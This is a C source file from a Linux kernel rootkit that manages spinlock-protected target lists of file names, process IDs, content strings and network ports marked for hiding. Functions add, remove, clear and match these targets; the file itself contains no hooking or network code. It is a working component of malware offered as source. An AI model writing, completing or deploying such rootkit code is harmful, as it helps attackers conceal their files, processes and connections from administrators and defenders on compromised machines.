// SPDX-License-Identifier: GPL-2.0
// core/target.c - Spinlocked target lists for hiding.
#include "rootkit.h"
#include <linux/string.h>

struct rk_target_list rk_file_targets;
struct rk_target_list rk_pid_targets;
struct rk_target_list rk_content_targets;
struct rk_target_list rk_port_targets;

void rk_target_init(struct rk_target_list *list)
{
	spin_lock_init(&list->lock);
	list->count = 0;
}

int rk_target_add(struct rk_target_list *list, const char *name)
{
	unsigned long flags;
	int idx;

	if (!name || !*name)
		return -EINVAL;
	spin_lock_irqsave(&list->lock, flags);
	if (list->count >= RK_TARGET_MAX) {
		idx = -ENOSPC;
	} else {
		idx = list->count;
		strscpy(list->targets[idx], name, RK_NAME_MAX);
		list->count++;
	}
	spin_unlock_irqrestore(&list->lock, flags);
	return idx;
}

int rk_target_remove(struct rk_target_list *list, int idx)
{
	unsigned long flags;
	int ret = 0;

	spin_lock_irqsave(&list->lock, flags);
	if (idx < 0 || idx >= list->count) {
		ret = -EINVAL;
		goto out;
	}
	if (idx < list->count - 1) {
		memmove(&list->targets[idx], &list->targets[idx + 1],
			(list->count - idx - 1) * RK_NAME_MAX);
	}
	list->count--;
out:
	spin_unlock_irqrestore(&list->lock, flags);
	return ret;
}

int rk_target_remove_name(struct rk_target_list *list, const char *name)
{
	unsigned long flags;
	int i;

	spin_lock_irqsave(&list->lock, flags);
	for (i = 0; i < list->count; i++) {
		if (strcmp(list->targets[i], name) == 0) {
			if (i < list->count - 1)
				memmove(&list->targets[i],
					&list->targets[i + 1],
					(list->count - i - 1) * RK_NAME_MAX);
			list->count--;
			spin_unlock_irqrestore(&list->lock, flags);
			return 0;
		}
	}
	spin_unlock_irqrestore(&list->lock, flags);
	return -ENOENT;
}

void rk_target_clear(struct rk_target_list *list)
{
	unsigned long flags;

	spin_lock_irqsave(&list->lock, flags);
	list->count = 0;
	spin_unlock_irqrestore(&list->lock, flags);
}

bool rk_target_match(struct rk_target_list *list, const char *name)
{
	unsigned long flags;
	bool found = false;
	int i;

	spin_lock_irqsave(&list->lock, flags);
	for (i = 0; i < list->count; i++) {
		if (strcmp(list->targets[i], name) == 0) {
			found = true;
			break;
		}
	}
	spin_unlock_irqrestore(&list->lock, flags);
	return found;
}

bool rk_line_matches(struct rk_target_list *list, const char *line, int len)
{
	unsigned long flags;
	bool found = false;
	int i;

	spin_lock_irqsave(&list->lock, flags);
	for (i = 0; i < list->count; i++) {
		if (strnstr(line, list->targets[i], len)) {
			found = true;
			break;
		}
	}
	spin_unlock_irqrestore(&list->lock, flags);
	return found;
}
